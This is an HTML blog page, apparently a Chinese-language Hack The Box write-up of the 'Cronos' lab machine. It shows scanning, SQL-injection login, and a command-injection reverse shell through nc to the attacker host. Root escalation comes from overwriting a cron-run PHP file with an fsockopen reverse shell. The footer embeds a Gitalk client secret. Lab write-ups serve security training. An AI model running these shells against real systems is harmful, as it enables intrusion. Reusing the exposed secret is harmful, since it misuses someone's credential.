@@ -1,0 +1,741 @@
+<!DOCTYPE html>
+<html>
+<head>
+    
+
+    
+
+    
+
+
+
+    <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="utf-8">
+    
+    
+    
+    
+    <title>Cronos - Hackthebox | Lucifiel&#39;s Blog | Lucifiel 技术博客</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    
+    <meta name="theme-color" content="#3F51B5">
+    
+    
+    <meta name="keywords" content="Hackthebox">
+    <meta name="description" content="Hackthebox - Cronos靶场信息  靶场类型  信息收集Nmap┌──(root㉿lucifiel)-[~&#x2F;Desktop] └─# nmap -sS -sC -sV -A -p- --min-rate 5000 10.10.10.13 Starting Nmap 7.92 ( https:&#x2F;&#x2F;nmap.org ) at 2022-07-04 09:52 CST Warning: 1">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Cronos - Hackthebox">
+<meta property="og:url" content="http://www.lucifiel.com/2022/07/14/Hackthebox/Hackthebox-Cronos/index.html">
+<meta property="og:site_name" content="Lucifiel&#39;s Blog">
+<meta property="og:description" content="Hackthebox - Cronos靶场信息  靶场类型  信息收集Nmap┌──(root㉿lucifiel)-[~&#x2F;Desktop] └─# nmap -sS -sC -sV -A -p- --min-rate 5000 10.10.10.13 Starting Nmap 7.92 ( https:&#x2F;&#x2F;nmap.org ) at 2022-07-04 09:52 CST Warning: 1">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://www.lucifiel.com/2022/07/14/Hackthebox/Hackthebox-Cronos/67128da5-1ac4-44a6-a2de-c2db0f868ce1.png">
+<meta property="og:image" content="http://www.lucifiel.com/2022/07/14/Hackthebox/Hackthebox-Cronos/c9796dd4-0ff5-449f-b3c1-2de36d4ed32f.png">
+<meta property="og:image" content="http://www.lucifiel.com/2022/07/14/Hackthebox/Hackthebox-Cronos/d025b17e-55e9-473e-aa8a-5c3aa18a8669.png">
+<meta property="og:image" content="http://www.lucifiel.com/2022/07/14/Hackthebox/Hackthebox-Cronos/c14290bd-a94b-4907-af49-1fee44a80db5.png">
+<meta property="og:image" content="http://www.lucifiel.com/2022/07/14/Hackthebox/Hackthebox-Cronos/aa9434e6-e52a-4061-a083-11b9720b32ec.png">
+<meta property="og:image" content="http://www.lucifiel.com/2022/07/14/Hackthebox/Hackthebox-Cronos/dc7220e5-c315-42b4-ab1b-d849145c0e89.png">
+<meta property="og:image" content="http://www.lucifiel.com/2022/07/14/Hackthebox/Hackthebox-Cronos/5e7fa2df-3927-4a0f-b8b7-31c992d700ad.png">
+<meta property="og:image" content="http://www.lucifiel.com/2022/07/14/Hackthebox/Hackthebox-Cronos/3e09e155-33cd-45c5-a035-cc220bd33f92.png">
+<meta property="og:image" content="http://www.lucifiel.com/2022/07/14/Hackthebox/Hackthebox-Cronos/b141a31f-738d-4a56-ba8e-ef0d8c5add89.png">
+<meta property="article:published_time" content="2022-07-14T11:38:36.000Z">
+<meta property="article:modified_time" content="2023-06-13T03:42:19.400Z">
+<meta property="article:author" content="Lucifiel">
+<meta property="article:tag" content="Hackthebox">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://www.lucifiel.com/2022/07/14/Hackthebox/Hackthebox-Cronos/67128da5-1ac4-44a6-a2de-c2db0f868ce1.png">
+    
+        <link rel="alternate" type="application/atom+xml" title="Lucifiel&#39;s Blog" href="/atom.xml">
+    
+    <link rel="shortcut icon" href="/favicon.ico">
+    <link rel="stylesheet" href="//unpkg.com/hexo-theme-material-indigo@latest/css/style.css">
+    <script>window.lazyScripts=[]</script>
+
+    <!-- custom head -->
+    
+
+<meta name="generator" content="Hexo 4.2.1"><!-- hexo-inject:begin --><!-- hexo-inject:end --></head>
+
+<body>
+    <!-- hexo-inject:begin --><!-- hexo-inject:end --><div id="loading" class="active"></div>
+
+    <aside id="menu" class="hide" >
+  <div class="inner flex-row-vertical">
+    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
+        <i class="icon icon-lg icon-close"></i>
+    </a>
+    <div class="brand-wrap" style="background-image:url(/img/brand.jpg)">
+      <div class="brand">
+        <a href="/" class="avatar waves-effect waves-circle waves-light">
+          <img src="/img/avatar.jpg">
+        </a>
+        <hgroup class="introduce">
+          <h5 class="nickname">Lucifiel</h5>
+          <a href="mailto:LucifielHack@qq.com" title="LucifielHack@qq.com" class="mail">LucifielHack@qq.com</a>
+        </hgroup>
+      </div>
+    </div>
+    <div class="scroll-wrap flex-col">
+      <ul class="nav">
+        
+            <li class="waves-block waves-effect">
+              <a href="/"  >
+                <i class="icon icon-lg icon-home"></i>
+                主页
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/archives"  >
+                <i class="icon icon-lg icon-archives"></i>
+                Archives
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/tags"  >
+                <i class="icon icon-lg icon-tags"></i>
+                Tags
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/categories"  >
+                <i class="icon icon-lg icon-th-list"></i>
+                Categories
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="https://github.com/LucifielHack" target="_blank" >
+                <i class="icon icon-lg icon-github"></i>
+                Github
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/about"  >
+                <i class="icon icon-lg icon-user"></i>
+                About
+              </a>
+            </li>
+        
+      </ul>
+    </div>
+  </div>
+</aside>
+
+    <main id="main">
+        <header class="top-header" id="header">
+    <div class="flex-row">
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light on" id="menu-toggle">
+          <i class="icon icon-lg icon-navicon"></i>
+        </a>
+        <div class="flex-col header-title ellipsis">Cronos - Hackthebox</div>
+        
+        <div class="search-wrap" id="search-wrap">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
+                <i class="icon icon-lg icon-chevron-left"></i>
+            </a>
+            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="输入感兴趣的关键字">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
+                <i class="icon icon-lg icon-search"></i>
+            </a>
+        </div>
+        
+        
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menuShare">
+            <i class="icon icon-lg icon-share-alt"></i>
+        </a>
+        
+    </div>
+</header>
+<header class="content-header post-header">
+
+    <div class="container fade-scale">
+        <h1 class="title">Cronos - Hackthebox</h1>
+        <h5 class="subtitle">
+            
+                <time datetime="2022-07-14T11:38:36.000Z" itemprop="datePublished" class="page-time">
+  2022-07-14
+</time>
+
+
+            
+        </h5>
+    </div>
+
+    
+
+
+</header>
+
+
+<div class="container body-wrap">
+    
+    <aside class="post-widget">
+        <nav class="post-toc-wrap post-toc-shrink" id="post-toc">
+            <h4>TOC</h4>
+            <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#Hackthebox-Cronos"><span class="post-toc-text">Hackthebox - Cronos</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#靶场信息"><span class="post-toc-text">靶场信息</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#靶场类型"><span class="post-toc-text">靶场类型</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#信息收集"><span class="post-toc-text">信息收集</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Nmap"><span class="post-toc-text">Nmap</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Http"><span class="post-toc-text">Http</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#子域名"><span class="post-toc-text">子域名</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#漏洞利用"><span class="post-toc-text">漏洞利用</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#权限提升"><span class="post-toc-text">权限提升</span></a></li></ol>
+        </nav>
+    </aside>
+
+
+<article id="post-Hackthebox/Hackthebox-Cronos"
+  class="post-article article-type-post fade" itemprop="blogPost">
+
+    <div class="post-card">
+        <h1 class="post-card-title">Cronos - Hackthebox</h1>
+        <div class="post-meta">
+            <time class="post-time" title="2022-07-14 19:38:36" datetime="2022-07-14T11:38:36.000Z"  itemprop="datePublished">2022-07-14</time>
+
+            
+
+
+            
+<span id="busuanzi_container_page_pv" title="文章总阅读量" style='display:none'>
+    <i class="icon icon-eye icon-pr"></i><span id="busuanzi_value_page_pv"></span>
+</span>
+
+
+        </div>
+        <div class="post-content" id="post-content" itemprop="postContent">
+            <h1 id="Hackthebox-Cronos"><a href="#Hackthebox-Cronos" class="headerlink" title="Hackthebox - Cronos"></a>Hackthebox - Cronos</h1><h1 id="靶场信息"><a href="#靶场信息" class="headerlink" title="靶场信息"></a>靶场信息</h1><img src="/2022/07/14/Hackthebox/Hackthebox-Cronos/67128da5-1ac4-44a6-a2de-c2db0f868ce1.png" class>
+
+<h1 id="靶场类型"><a href="#靶场类型" class="headerlink" title="靶场类型"></a>靶场类型</h1><img src="/2022/07/14/Hackthebox/Hackthebox-Cronos/c9796dd4-0ff5-449f-b3c1-2de36d4ed32f.png" class>
+
+<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><h2 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h2><pre><code class="bash">┌──(root㉿lucifiel)-[~/Desktop]
+└─# nmap -sS -sC -sV -A -p- --min-rate 5000 10.10.10.13
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-04 09:52 CST
+Warning: 10.10.10.13 giving up on port because retransmission cap hit (10).
+Nmap scan report for 10.10.10.13
+Host is up (0.38s latency).
+Not shown: 65518 closed tcp ports (reset)
+PORT      STATE    SERVICE VERSION
+22/tcp    open     ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 18:b9:73:82:6f:26:c7:78:8f:1b:39:88:d8:02:ce:e8 (RSA)
+|   256 1a:e6:06:a6:05:0b:bb:41:92:b0:28:bf:7f:e5:96:3b (ECDSA)
+|_  256 1a:0e:e7:ba:00:cc:02:01:04:cd:a3:a9:3f:5e:22:20 (ED25519)
+53/tcp    open     domain  ISC BIND 9.10.3-P4 (Ubuntu Linux)
+| dns-nsid: 
+|_  bind.version: 9.10.3-P4-Ubuntu
+80/tcp    open     http    Apache httpd 2.4.18 ((Ubuntu))
+|_http-title: Apache2 Ubuntu Default Page: It works
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+11077/tcp filtered unknown
+16431/tcp filtered unknown
+23675/tcp filtered unknown
+23791/tcp filtered unknown
+24707/tcp filtered unknown
+28968/tcp filtered unknown
+30070/tcp filtered unknown
+33874/tcp filtered unknown
+36836/tcp filtered unknown
+37062/tcp filtered unknown
+41846/tcp filtered unknown
+42917/tcp filtered unknown
+45607/tcp filtered unknown
+51186/tcp filtered unknown
+Aggressive OS guesses: Linux 3.2 - 4.9 (95%), Linux 3.16 (95%), Linux 3.18 (95%), ASUS RT-N56U WAP (Linux 3.4) (95%), Linux 3.1 (93%), Linux 3.2 (93%), Linux 3.10 - 4.11 (93%), Linux 3.12 (93%), Linux 3.13 (93%), Linux 3.8 - 3.11 (93%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 2 hops
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE (using port 443/tcp)
+HOP RTT       ADDRESS
+1   368.17 ms 10.10.14.1
+2   468.12 ms 10.10.10.13
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 87.93 seconds
+</code></pre>
+<h2 id="Http"><a href="#Http" class="headerlink" title="Http"></a>Http</h2><img src="/2022/07/14/Hackthebox/Hackthebox-Cronos/d025b17e-55e9-473e-aa8a-5c3aa18a8669.png" class>
+
+<p>默认的 apache 页面，fuzz 页面也没有可用的东西，可能在子域名</p>
+<h2 id="子域名"><a href="#子域名" class="headerlink" title="子域名"></a>子域名</h2><p>加一个 host 解析</p>
+<pre><code class="bash">echo 10.10.10.13 cronos.htb &gt;&gt; /etc/hosts
+</code></pre>
+<p>然后跑一个子域名</p>
+<pre><code class="bash">┌──(root㉿lucifiel)-[~/Desktop]
+└─# ffuf -u &#39;http://cronos.htb/&#39; -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H &#39;Host:FUZZ.cronos.htb&#39; -fs 0,11439
+
+        /&#39;___\  /&#39;___\           /&#39;___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v1.5.0 Kali Exclusive &lt;3
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://cronos.htb/
+ :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
+ :: Header           : Host: FUZZ.cronos.htb
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
+ :: Filter           : Response size: 0,11439
+________________________________________________
+
+admin                   [Status: 200, Size: 1547, Words: 525, Lines: 57, Duration: 5550ms]
+www                     [Status: 200, Size: 2319, Words: 990, Lines: 86, Duration: 1331ms]
+</code></pre>
+<img src="/2022/07/14/Hackthebox/Hackthebox-Cronos/c14290bd-a94b-4907-af49-1fee44a80db5.png" class>
+
+<p>fuzz 出有一个 admin，然后这边是加上 host 解析后，有了不同的变化</p>
+<p>把解析出来的子域名给加个 hosts 解析</p>
+<pre><code class="bash">echo 10.10.10.13 admin.cronos.htb &gt;&gt; /etc/hosts
+</code></pre>
+<img src="/2022/07/14/Hackthebox/Hackthebox-Cronos/aa9434e6-e52a-4061-a083-11b9720b32ec.png" class>
+
+<p>这边有一个登陆点，但是没有密码</p>
+<h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><img src="/2022/07/14/Hackthebox/Hackthebox-Cronos/dc7220e5-c315-42b4-ab1b-d849145c0e89.png" class>
+
+<p>测试了一下存在 sql 注入，可直接使用万能密码进行登录</p>
+<img src="/2022/07/14/Hackthebox/Hackthebox-Cronos/5e7fa2df-3927-4a0f-b8b7-31c992d700ad.png" class>
+
+<p>登入后有一个 traceroute 和 ping 功能，和 DVWA 相似啊，应该是可以拼接直接执行命令</p>
+<img src="/2022/07/14/Hackthebox/Hackthebox-Cronos/3e09e155-33cd-45c5-a035-cc220bd33f92.png" class>
+
+<p>去尝试一下是否可执行</p>
+<img src="/2022/07/14/Hackthebox/Hackthebox-Cronos/b141a31f-738d-4a56-ba8e-ef0d8c5add89.png" class>
+
+<p>确定可以执行命令</p>
+<p>使用 nc 进行监听一个端口</p>
+<pre><code class="bash">nc -nvlp 4444
+</code></pre>
+<pre><code class="bash">127.0.0.1|rm -f /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.4 4444 &gt;/tmp/f
+</code></pre>
+<p>使用如上语句来进行反弹 shel</p>
+<pre><code class="bash">┌──(root㉿lucifiel)-[~/Desktop]
+└─# nc -nvlp 4444                                      
+listening on [any] 4444 ...
+connect to [10.10.14.4] from (UNKNOWN) [10.10.10.13] 57784
+/bin/sh: 0: can&#39;t access tty; job control turned off
+$ whoami&amp;&amp;id
+www-data
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+</code></pre>
+<p>成功获得一个 shel</p>
+<pre><code class="bash">www-data@cronos:/home/noulis$ cat user.txt
+cat user.txt
+acd300bee378d6a90aece189fc7ce7f6
+</code></pre>
+<p>成功拿到 user 权限的 flag 文件</p>
+<h1 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h1><pre><code class="bash">╔══════════╣ Cron jobs
+╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#scheduled-cron-jobs                                                                                                                                                      
+/usr/bin/crontab                                                                                                                                                                                                                            
+incrontab Not Found
+-rw-r--r-- 1 root root     797 Apr  9  2017 /etc/crontab                                                                                                                                                                                    
+
+/etc/cron.d:
+total 24
+drwxr-xr-x  2 root root 4096 May 10 14:51 .
+drwxr-xr-x 95 root root 4096 May 10 14:51 ..
+-rw-r--r--  1 root root  102 Apr  6  2016 .placeholder
+-rw-r--r--  1 root root  589 Jul 16  2014 mdadm
+-rw-r--r--  1 root root  670 Mar  1  2016 php
+-rw-r--r--  1 root root  191 Mar 22  2017 popularity-contest
+
+/etc/cron.daily:
+total 60
+drwxr-xr-x  2 root root 4096 May 10 14:51 .
+drwxr-xr-x 95 root root 4096 May 10 14:51 ..
+-rw-r--r--  1 root root  102 Apr  6  2016 .placeholder
+-rwxr-xr-x  1 root root  539 Apr  6  2016 apache2
+-rwxr-xr-x  1 root root  376 Mar 31  2016 apport
+-rwxr-xr-x  1 root root 1474 Jan 17  2017 apt-compat
+-rwxr-xr-x  1 root root  355 May 22  2012 bsdmainutils
+-rwxr-xr-x  1 root root 1597 Nov 27  2015 dpkg
+-rwxr-xr-x  1 root root  372 May  6  2015 logrotate
+-rwxr-xr-x  1 root root 1293 Nov  6  2015 man-db
+-rwxr-xr-x  1 root root  539 Jul 16  2014 mdadm
+-rwxr-xr-x  1 root root  435 Nov 18  2014 mlocate
+-rwxr-xr-x  1 root root  249 Nov 13  2015 passwd
+-rwxr-xr-x  1 root root 3449 Feb 26  2016 popularity-contest
+-rwxr-xr-x  1 root root  214 May 24  2016 update-notifier-common
+
+/etc/cron.hourly:
+total 12
+drwxr-xr-x  2 root root 4096 May 10 14:51 .
+drwxr-xr-x 95 root root 4096 May 10 14:51 ..
+-rw-r--r--  1 root root  102 Apr  6  2016 .placeholder
+
+/etc/cron.monthly:
+total 12
+drwxr-xr-x  2 root root 4096 May 10 14:51 .
+drwxr-xr-x 95 root root 4096 May 10 14:51 ..
+-rw-r--r--  1 root root  102 Apr  6  2016 .placeholder
+
+/etc/cron.weekly:
+total 24
+drwxr-xr-x  2 root root 4096 May 10 14:51 .
+drwxr-xr-x 95 root root 4096 May 10 14:51 ..
+-rw-r--r--  1 root root  102 Apr  6  2016 .placeholder
+-rwxr-xr-x  1 root root   86 Apr 13  2016 fstrim
+-rwxr-xr-x  1 root root  771 Nov  6  2015 man-db
+-rwxr-xr-x  1 root root  211 May 24  2016 update-notifier-common
+
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+17 *    * * *   root    cd / &amp;&amp; run-parts --report /etc/cron.hourly
+25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.daily )
+47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.weekly )
+52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.monthly )
+* * * * *       root    php /var/www/laravel/artisan schedule:run &gt;&gt; /dev/null 2&gt;&amp;1
+</code></pre>
+<p>这边看到一个有趣的程序运行在 root 上 <code>/var/www/laravel/artisan</code> </p>
+<pre><code class="bash">www-data@cronos:/var/www/laravel$ ls -la /var/www/laravel/artisan
+ls -la /var/www/laravel/artisan
+-rwxr-xr-x 1 www-data www-data 1646 Apr  9  2017 /var/www/laravel/artisan
+</code></pre>
+<p>这边是可以看到，我们拥有写入权限，看看这是什么东西</p>
+<pre><code class="bash">www-data@cronos:/var/www/laravel$ cat artisan
+cat artisan
+#!/usr/bin/env php
+&lt;?php
+
+/*
+|--------------------------------------------------------------------------
+| Register The Auto Loader
+|--------------------------------------------------------------------------
+|
+| Composer provides a convenient, automatically generated class loader
+| for our application. We just need to utilize it! We&#39;ll require it
+| into the script here so that we do not have to worry about the
+| loading of any our classes &quot;manually&quot;. Feels great to relax.
+|
+*/
+
+require __DIR__.&#39;/bootstrap/autoload.php&#39;;
+
+$app = require_once __DIR__.&#39;/bootstrap/app.php&#39;;
+
+/*
+|--------------------------------------------------------------------------
+| Run The Artisan Application
+|--------------------------------------------------------------------------
+|
+| When we run the console application, the current CLI command will be
+| executed in this console and the response sent back to a terminal
+| or another output device for the developers. Here goes nothing!
+|
+*/
+
+$kernel = $app-&gt;make(Illuminate\Contracts\Console\Kernel::class);
+
+$status = $kernel-&gt;handle(
+    $input = new Symfony\Component\Console\Input\ArgvInput,
+    new Symfony\Component\Console\Output\ConsoleOutput
+);
+
+/*
+|--------------------------------------------------------------------------
+| Shutdown The Application
+|--------------------------------------------------------------------------
+|
+| Once Artisan has finished running. We will fire off the shutdown events
+| so that any final work may be done by the application before we shut
+| down the process. This is the last thing to happen to the request.
+|
+*/
+
+$kernel-&gt;terminate($input, $status);
+
+exit($status);
+</code></pre>
+<p>似乎是一个 php 的脚本，干啥的咱就别管他了，咱们可以写入一个用 php 反弹 shell 的语句进去，进行反弹</p>
+<p>再开个 nc 进行一个其他端口的监听</p>
+<pre><code class="bash">nc -nvlp 5555
+</code></pre>
+<pre><code class="bash">echo &#39;&lt;?php $sock=fsockopen(&quot;10.10.14.4&quot;,5555);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;); ?&gt;&#39; &gt; /var/www/laravel/artisan
+</code></pre>
+<p>然后执行后，等待一会儿就行了</p>
+<pre><code class="bash">┌──(root㉿lucifiel)-[~/Desktop]
+└─# nc -nvlp 5555                                       
+listening on [any] 5555 ...
+connect to [10.10.14.4] from (UNKNOWN) [10.10.10.13] 53042
+/bin/sh: 0: can&#39;t access tty; job control turned off
+# whoami&amp;&amp;id
+root
+uid=0(root) gid=0(root) groups=0(root)
+</code></pre>
+<p>成功提权到 root 权限</p>
+<pre><code class="bash"># cat /root/root.txt
+817402c7d13dc6ad8eff1f1af36d3382
+</code></pre>
+<p>成功获得 root 权限的 flag 文件</p>
+
+        </div>
+
+        <blockquote class="post-copyright">
+    
+    <footer>
+        <a href="http://www.lucifiel.com">
+            <img src="/img/avatar.jpg" alt="Lucifiel">
+            Lucifiel
+        </a>
+    </footer>
+</blockquote>
+
+        
+
+
+        <div class="post-footer">
+            
+	<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Hackthebox/" rel="tag">Hackthebox</a></li></ul>
+
+
+            
+<div class="page-share-wrap">
+    
+
+<div class="page-share" id="pageShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://www.lucifiel.com/2022/07/14/Hackthebox/Hackthebox-Cronos/&title=《Cronos - Hackthebox》 — Lucifiel's Blog&pic=http://www.lucifiel.com/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://www.lucifiel.com/2022/07/14/Hackthebox/Hackthebox-Cronos/&title=《Cronos - Hackthebox》 — Lucifiel's Blog&source=Lucifiel 技术博客" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=http://www.lucifiel.com/2022/07/14/Hackthebox/Hackthebox-Cronos/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《Cronos - Hackthebox》 — Lucifiel's Blog&url=http://www.lucifiel.com/2022/07/14/Hackthebox/Hackthebox-Cronos/&via=http://www.lucifiel.com" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=http://www.lucifiel.com/2022/07/14/Hackthebox/Hackthebox-Cronos/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+
+    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
+        <i class="icon icon-share-alt icon-lg"></i>
+    </a>
+</div>
+
+
+
+        </div>
+    </div>
+
+    
+<nav class="post-nav flex-row flex-justify-between">
+  
+    <div class="waves-block waves-effect prev">
+      <a href="/2022/08/01/Hackthebox/Hackthebox-Node/" id="post-prev" class="post-nav-link">
+        <div class="tips"><i class="icon icon-angle-left icon-lg icon-pr"></i> Prev</div>
+        <h4 class="title">Node - Hackthebox</h4>
+      </a>
+    </div>
+  
+
+  
+    <div class="waves-block waves-effect next">
+      <a href="/2022/07/11/Hackthebox/Hackthebox-SolidState/" id="post-next" class="post-nav-link">
+        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
+        <h4 class="title">SolidState - Hackthebox</h4>
+      </a>
+    </div>
+  
+</nav>
+
+
+
+    
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<section class="comments" id="comments">
+    <div id="gitalk-container"></div>
+    <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+    <script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+    <script>
+        var id = location.pathname
+        if (location.pathname.length > 50) {
+          id = location.pathname.replace(/\/\d+\/\d+\/\d+\//, '').replace('/', '').substring(0, 50)
+        }
+        const gitalk = new Gitalk({
+          clientID: 'cf0a9809323df14a9168',
+          clientSecret: 'a30d7a21bf6d88b7ad5c1f5d1bfc45881c49b2ed',
+          repo: 'LucifielHack.github.io',
+          owner: 'LucifielHack',
+          admin: ['LucifielHack'],
+          id: id,      // Ensure uniqueness and length less than 50
+          title: document.title.split('|')[0],
+          distractionFreeMode: false  // Facebook-like distraction free mode
+        })
+
+        gitalk.render('gitalk-container')
+    </script>
+</section>
+
+
+
+
+</article>
+
+
+
+</div>
+
+        <footer class="footer">
+    <div class="top">
+        
+<p>
+    <span id="busuanzi_container_site_uv" style='display:none'>
+        站点总访客数：<span id="busuanzi_value_site_uv"></span>
+    </span>
+    <span id="busuanzi_container_site_pv" style='display:none'>
+        站点总访问量：<span id="busuanzi_value_site_pv"></span>
+    </span>
+</p>
+
+
+        <p>
+            <!--- 
+                <span><a href="/atom.xml" target="_blank" class="rss" title="rss"><i class="icon icon-lg icon-rss"></i></a></span>
+            
+            <span>footer.license</span> --->
+        </p>
+    </div>
+    <div class="bottom">
+        <p><span>Lucifiel &copy; 2020 - 2023</span>
+            <span>
+                
+                Power by Lucifiel</a>
+            </span>
+        </p>
+    </div>
+</footer>
+
+    </main>
+    <div class="mask" id="mask"></div>
+<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>
+
+
+
+<div class="global-share" id="globalShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://www.lucifiel.com/2022/07/14/Hackthebox/Hackthebox-Cronos/&title=《Cronos - Hackthebox》 — Lucifiel's Blog&pic=http://www.lucifiel.com/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://www.lucifiel.com/2022/07/14/Hackthebox/Hackthebox-Cronos/&title=《Cronos - Hackthebox》 — Lucifiel's Blog&source=Lucifiel 技术博客" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=http://www.lucifiel.com/2022/07/14/Hackthebox/Hackthebox-Cronos/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《Cronos - Hackthebox》 — Lucifiel's Blog&url=http://www.lucifiel.com/2022/07/14/Hackthebox/Hackthebox-Cronos/&via=http://www.lucifiel.com" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=http://www.lucifiel.com/2022/07/14/Hackthebox/Hackthebox-Cronos/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+<div class="page-modal wx-share" id="wxShare">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
